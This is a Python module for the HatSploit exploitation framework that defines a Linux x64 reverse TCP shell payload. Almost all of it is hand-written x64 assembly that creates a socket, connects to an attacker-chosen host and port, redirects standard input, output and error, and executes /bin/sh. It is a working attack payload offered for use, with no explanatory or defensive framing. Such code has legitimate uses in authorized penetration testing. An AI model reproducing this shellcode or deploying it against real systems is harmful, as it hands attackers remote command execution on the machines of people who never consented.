"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from pex.assembler import Assembler
from pex.socket import Socket

from hatsploit.lib.payload import Payload


class HatSploitPayload(Payload, Assembler, Socket):
    details = {
        'Name': "Linux x64 Shell Reverse TCP",
        'Payload': "linux/x64/shell_reverse_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer',
        ],
        'Description': "Shell reverse TCP payload for Linux x64.",
        'Architecture': "x64",
        'Platform': "linux",
        'Rank': "high",
        'Type': "reverse_tcp",
    }

    def run(self):
        rhost = self.pack_host(self.handler['RHOST'])
        rport = self.pack_port(self.handler['RPORT'])

        return self.assemble(
            self.details['Architecture'],
            f"""
            start:
                push 0x29
                pop rax
                cdq
                push 0x2
                pop rdi
                push 0x1
                pop rsi
                syscall

                xchg rdi, rax
                movabs rcx, 0x{rhost.hex()}{rport.hex()}0002
                push rcx
                mov rsi, rsp
                push 0x10
                pop rdx
                push 0x2a
                pop rax
                syscall

                push 0x3
                pop rsi

            dup:
                dec rsi
                push 0x21
                pop rax
                syscall

                jne dup
                push 0x3b
                pop rax
                cdq
                movabs rbx, 0x68732f6e69622f
                push rbx
                mov rdi, rsp
                push rdx
                push rdi
                mov rsi, rsp
                syscall
            """
        )
